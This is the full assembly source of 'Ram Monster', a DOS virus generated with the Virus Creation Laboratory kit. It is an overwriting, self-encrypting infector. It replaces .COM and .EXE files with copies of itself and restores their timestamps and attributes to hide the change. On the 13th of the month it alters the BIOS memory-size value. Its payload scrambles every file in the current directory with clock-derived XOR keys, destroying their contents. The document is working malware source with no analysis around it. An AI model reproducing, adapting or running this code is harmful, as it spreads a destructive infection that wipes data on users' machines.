; RAMMONST.ASM -- Ram Monster Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Virucidal Maniac

virus_type  equ 1           ; Overwriting Virus
is_encrypted    equ 1           ; We're encrypted
tsr_virus   equ 0           ; We're not TSR

code        segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org 0100h

start       label   near

main        proc    near
flag:       xchg    dh,dh
        xchg    cx,ax
        xchg    cx,ax

        call    encrypt_decrypt     ; Decrypt the virus

start_of_code   label   near

        call    search_files        ; Find and infect a file
        call    search_files        ; Find and infect another file
        call    get_day
        cmp ax,000Dh        ; Did the function return 13?
        je  strt00          ; If equal, do effect
        jmp end00           ; Otherwise skip over it
strt00:     mov dx,00D5h        ; First argument is 213
        push    es          ; Save ES
        mov ax,040h         ; Set extra segment to 040h
        mov es,ax           ; (ROM BIOS)
        mov word ptr es:[013h],dx   ; Store new RAM ammount
        pop es          ; Restore ES

        push    bp          ; Save BP
        mov bp,sp           ; BP points to stack frame
        sub sp,34           ; Allocate 34 bytes on stack

        mov ah,038h         ; DOS get country function
        lea dx,[bp - 34]        ; DX points to unused buffer
        int 021h

        xchg    bx,ax           ; AX holds the country code

        mov sp,bp           ; Deallocate local buffer
        pop bp          ; Restore BP

end00:      call    get_dos_version
        or  ax,ax           ; Did the function return zero?
        jg  strt01          ; If greater, do effect
        jmp end01           ; Otherwise skip over it
strt01:     mov dx,offset data00    ; DX points to data
        push    bp          ; Save BP
        mov bp,sp           ; BP points to stack frame
        sub sp,4096         ; Allocate 4096-byte buffer
        push    di          ; Save DI
        mov ah,02Fh         ; DOS get DTA function
        int 021h
        mov di,bx           ; DI points to DTA
        mov ah,04Eh         ; DOS find first file function
        mov cx,00100111b        ; CX holds all file attributes
        int 021h
        jc  corrupt_end     ; If no files found then exit
corrupt_file:   mov ax,04301h       ; DOS set file attributes function
        xor cx,cx           ; File will have no attributes
        lea dx,[di + 01Eh]      ; DX points to file name
        int 021h
        mov ax,03D02h       ; DOS open file function, r/w
        lea dx,[di + 01Eh]      ; DX points to file name
        int 021h
        xchg    bx,ax           ; Transfer file handle to AX
c_crypt_loop:   mov ah,03Fh         ; DOS read from file function
        mov cx,4096         ; Read 4k of characters
        lea dx,[bp - 4096]      ; DX points to the buffer
        int 021h
        or  ax,ax           ; Were 0 bytes read?
        je  close_c_file        ; If so then close it up
        push    ax          ; Save AX
        lea si,[bp - 4096]      ; SI points to the buffer
        xor ah,ah           ; BIOS get clock ticks function
        int 01Ah
        pop cx          ; CX holds number of bytes read
        push    cx          ; Save CX
corrupt_bytes:  xor byte ptr [si],dl    ; XOR byte by clock ticks
        inc si          ; Do the next byte
        inc dx          ; Change the key for next byte
        loop    corrupt_bytes       ; Repeat until buffer is done
        pop dx          ; Restore DX (holds bytes read)
        push    dx          ; Save count for write
        mov ax,04201h       ; DOS file seek function, current
        mov cx,0FFFFh       ; Seeking backwards
        neg dx          ; Seeking backwards
        int 021h
        mov ah,040h         ; DOS write to file function
        pop cx          ; CX holds number of bytes read
        lea dx,[bp - 4096]      ; DX points to the buffer
        int 021h
        jmp short c_crypt_loop
close_c_file:   mov ax,05701h       ; DOS set file date/time function
        mov cx,[di + 016h]      ; CX holds old file time
        mov dx,[di + 018h]      ; DX holds old file data
        int 021h
        mov ah,03Eh         ; DOS close file function
        int 021h
        mov ax,04301h       ; DOS set file attributes function
        xor ch,ch           ; Clear CH for attributes
        mov cl,[di + 015h]      ; CL holds old attributes
        lea dx,[di + 01Eh]      ; DX points to file name
        int 021h
        mov ah,04Fh         ; DOS find next file function
        int 021h
        jnc corrupt_file        ; If successful do next file
corrupt_end:    pop di          ; Restore DI
        mov sp,bp           ; Deallocate local buffer
        pop bp          ; Restore BP

end01:      mov ax,04C00h       ; DOS terminate function
        int 021h
main        endp

search_files    proc    near
        mov dx,offset com_mask  ; DX points to "*.COM"
        call    find_files      ; Try to infect a file
        jnc done_searching      ; If successful then exit
        mov dx,offset exe_mask  ; DX points to "*.EXE"
        call    find_files      ; Try to infect a file
done_searching: ret             ; Return to caller

com_mask    db  "*.COM",0       ; Mask for all .COM files
exe_mask    db  "*.EXE",0       ; Mask for all .EXE files
search_files    endp

find_files  proc    near
        push    bp          ; Save BP

        mov ah,02Fh         ; DOS get DTA function
        int 021h
        push    bx          ; Save old DTA address

        mov bp,sp           ; BP points to local buffer
        sub sp,128          ; Allocate 128 bytes on stack

        push    dx          ; Save file mask
        mov ah,01Ah         ; DOS set DTA function
        lea dx,[bp - 128]       ; DX points to buffer
        int 021h

        mov ah,04Eh         ; DOS find first file function
        mov cx,00100111b        ; CX holds all file attributes
        pop dx          ; Restore file mask
find_a_file:    int 021h
        jc  done_finding        ; Exit if no files found
        call    infect_file     ; Infect the file!
        jnc done_finding        ; Exit if no error
        mov ah,04Fh         ; DOS find next file function
        jmp short find_a_file   ; Try finding another file

done_finding:   mov sp,bp           ; Restore old stack frame
        mov ah,01Ah         ; DOS set DTA function
        pop dx          ; Retrieve old DTA address
        int 021h

        pop bp          ; Restore BP
        ret             ; Return to caller
find_files  endp

infect_file proc    near
        mov ah,02Fh         ; DOS get DTA address function
        int 021h
        mov si,bx           ; SI points to the DTA

        mov byte ptr [set_carry],0  ; Assume we'll fail

        cmp word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
        jne infection_done      ; If it is then exit

        cmp word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
        je  infection_done      ; If it is then skip it

        cmp word ptr [si + 01Ah],(finish - start)
        jb  infection_done      ; If it's too small then exit

        mov ax,03D00h       ; DOS open file function, r/o
        lea dx,[si + 01Eh]      ; DX points to file name
        int 021h
        xchg    bx,ax           ; BX holds file handle

        mov ah,03Fh         ; DOS read from file function
        mov cx,4            ; CX holds bytes to read (4)
        mov dx,offset buffer    ; DX points to buffer
        int 021h

        mov ah,03Eh         ; DOS close file function
        int 021h

        push    si          ; Save DTA address before compare
        mov si,offset buffer    ; SI points to comparison buffer
        mov di,offset flag      ; DI points to virus flag
        mov cx,4            ; CX holds number of bytes (4)
    rep cmpsb               ; Compare the first four bytes
        pop si          ; Restore DTA address
        je  infection_done      ; If equal then exit
        mov byte ptr [set_carry],1  ; Success -- the file is OK

        mov ax,04301h       ; DOS set file attrib. function
        xor cx,cx           ; Clear all attributes
        lea dx,[si + 01Eh]      ; DX points to victim's name
        int 021h

        mov ax,03D02h       ; DOS open file function, r/w
        int 021h
        xchg    bx,ax           ; BX holds file handle

        push    si          ; Save SI through call
        call    encrypt_code        ; Write an encrypted copy
        pop si          ; Restore SI

        mov ax,05701h       ; DOS set file time function
        mov cx,[si + 016h]      ; CX holds old file time
        mov dx,[si + 018h]      ; DX holds old file date
        int 021h

        mov ah,03Eh         ; DOS close file function
        int 021h

        mov ax,04301h       ; DOS set file attrib. function
        xor ch,ch           ; Clear CH for file attribute
        mov cl,[si + 015h]      ; CX holds file's old attributes
        lea dx,[si + 01Eh]      ; DX points to victim's name
        int 021h

infection_done: cmp byte ptr [set_carry],1  ; Set carry flag if failed
        ret             ; Return to caller

buffer      db  4 dup (?)       ; Buffer to hold test data
set_carry   db  ?           ; Set-carry-on-exit flag
infect_file endp


get_day     proc    near
        mov ah,02Ah         ; DOS get date function
        int 021h
        mov al,dl           ; Copy day into AL
        cbw             ; Sign-extend AL into AX
        ret             ; Return to caller
get_day     endp

get_dos_version proc    near
        mov ah,030h         ; DOS get DOS version function
        int 021h
        mov bx,ax           ; Save return value in BX
        xor bl,bl           ; Clear DOS major version in BX
        xchg    bh,bl           ; Place 0 in BH, minor in BL
        cbw             ; Sign-extend AL into AX
        mov cl,100          ; CL holds multiplier
        mul cl          ; Multiply AL by 100
        add ax,bx           ; Add back the minor version
        ret             ; Return to caller
get_dos_version endp

data00      db  "*.*"

vcl_marker  db  "[VCL]",0       ; VCL creation marker

encrypt_code    proc    near
        mov si,offset encrypt_decrypt; SI points to cipher routine

        xor ah,ah           ; BIOS get time function
        int 01Ah
        mov word ptr [si + 8],dx    ; Low word of timer is new key

        xor byte ptr [si],1     ;
        xor byte ptr [si + 7],1 ; Change all SIs to DIs
        xor word ptr [si + 10],0101h; (and vice-versa)

        mov di,offset finish    ; Copy routine into heap
        mov cx,finish - encrypt_decrypt - 1  ; All but final RET
        push    si          ; Save SI for later
        push    cx          ; Save CX for later
    rep movsb               ; Copy the bytes

        mov si,offset write_stuff   ; SI points to write stuff
        mov cx,5            ; CX holds length of write
    rep movsb               ; Copy the bytes

        pop cx          ; Restore CX
        pop si          ; Restore SI
        inc cx          ; Copy the RET also this time
    rep movsb               ; Copy the routine again

        mov ah,040h         ; DOS write to file function
        mov dx,offset start     ; DX points to virus

        call    finish          ; Encrypt/write/decrypt

        ret             ; Return to caller

write_stuff:    mov cx,finish - start   ; Length of code
        int 021h
encrypt_code    endp

end_of_code label   near

encrypt_decrypt proc    near
        mov si,offset start_of_code ; SI points to code to decrypt
        mov cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:   db  081h,034h,00h,00h   ; XOR a word by the key
        inc si          ; Do the next word
        inc si          ;
        loop    xor_loop        ; Loop until we're through
        ret             ; Return to caller
encrypt_decrypt endp
finish      label   near

code        ends
        end main
        